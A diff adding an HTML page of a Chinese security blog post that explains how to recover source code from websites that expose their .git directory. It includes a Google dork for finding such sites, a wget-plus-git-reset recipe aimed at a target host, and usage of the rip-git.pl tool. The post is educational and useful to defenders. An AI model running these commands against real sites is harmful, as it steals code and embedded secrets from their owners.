@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>通过.git获取源码 - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="通过.git获取源码 - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/156/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            
+        </div>
+        <h1>通过.git获取源码</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2015-02-06 11:58"><i class="iconfont icon-date"></i>2015-02-06 11:58</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>本来是看到<a href="https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/">这个文章</a>，觉得还不错，想简单翻译一下搬到博客上来。结果晚上就发现一篇更详细的ppt。</p>
+
+<p>原 ppt 链接 http://www.slideshare.net/kost/ripping-web-accessible-git-files</p>
+
+<p>中文翻译基于 http://zone.wooyun.org/content/18004，有修改~</p>
+
+<p>在运行git init初始化代码库的时候 
+会在当前目录下产生.git目录，用来记录代码的变更等等</p>
+
+<p>.git目录结构如下</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>sky@linux:~/git-repo/test$ tree .git 
+.git 
+├── branches 
+├── config 
+├── description 
+├── HEAD 
+├── hooks 
+│   ├── applypatch-msg.sample 
+│   ├── commit-msg.sample 
+│   ├── post-update.sample 
+│   ├── pre-applypatch.sample 
+│   ├── pre-commit.sample 
+│   ├── prepare-commit-msg.sample 
+│   ├── pre-push.sample 
+│   ├── pre-rebase.sample 
+│   └── update.sample 
+├── info 
+│   └── exclude 
+├── objects 
+│   ├── info 
+│   └── pack 
+└── refs 
+    ├── heads 
+    └── tags 
+
+9 directories, 13 files 
+</code></pre>
+</div>
+
+<p>发布代码的之后，直接把开发目录拷贝过去（.git）也在里面，然后就中奖了。。。</p>
+
+<p>google一下：<code class="highlighter-rouge">".git"  intitle:"index of"</code></p>
+
+<p>人肉获取法：</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>mkdir git-test 
+cd git-test 
+#下载.git文件 
+wget --mirror --include-directories=/.git http://www.target.com/.git 
+cd www.target.com 
+#版本回退，得到了源代码 
+git reset --hard 
+</code></pre>
+</div>
+
+<p>如果apache是Options FollowSymLinks，.git访问是403，上面这种人肉法就失效了。。。</p>
+
+<p>需要借助工具，来遍历关键文件并下载恢复： 
+https://github.com/kost/dvcs-ripper</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>rip-git.pl 
+
+Example: ./rip-git.pl -v -u http://www.example.com/.git/ 
+</code></pre>
+</div>
+
+<p>实例： 
+<a href="http://www.wooyun.org/bugs/wooyun-2014-076372">WooYun: 友盟网git服务使用不当导致源代码泄露</a> 
+<a href="http://drops.wooyun.org/papers/4439">被忽视的开发安全问题</a>
+<a href="http://drops.wooyun.org/tips/4070">HCTF writeup(web)</a>
+<a href="http://drops.wooyun.org/papers/4386">One git command may cause you hacked(CVE-2014-9390)</a></p>
+
+<p>git教程（写的真心详细） 
+http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000</p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=通过.git获取源码&article_id=/index.php/archives/156/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
